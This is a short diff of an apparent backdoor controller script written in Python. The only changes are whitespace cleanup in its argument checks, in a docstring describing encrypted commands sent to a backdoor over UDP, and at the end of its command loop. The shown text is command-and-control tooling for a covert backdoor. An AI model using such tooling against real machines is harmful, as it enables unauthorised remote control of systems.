@@ -37,7 +37,7 @@ if not validate_ipv4_address(args.controller_ip):
 if not validate_ipv4_address(args.backdoor_ip):
     print(f"Invalid IPv4 Address: '{args.backdoor_ip}'")
     exit(1)
-    
+
 if not validate_nic_interface(args.interface):
     print(f"Network Interface does not exist: '{args.interface}'")
     exit(1)
@@ -80,10 +80,10 @@ def subprocess_start():
 
 def send_udp(data: str):
     """
-        Sends a UDP packet to the backdoor which is supposed to contain a command. 
-        All commands get sent to a specific UDP port on the backdoor machine. 
-        The UDP packet that is sent contains the encrypted command in the payload 
-        section. The backdoor machine listens for a specific port to know that 
+        Sends a UDP packet to the backdoor which is supposed to contain a command.
+        All commands get sent to a specific UDP port on the backdoor machine.
+        The UDP packet that is sent contains the encrypted command in the payload
+        section. The backdoor machine listens for a specific port to know that
         the UDP packet is ours.
     """
     data = data.encode("utf-8")
@@ -167,4 +167,3 @@ if __name__ == "__main__":
         else:
             print(f"Command not found: {command}")
     decode_process.kill()
-
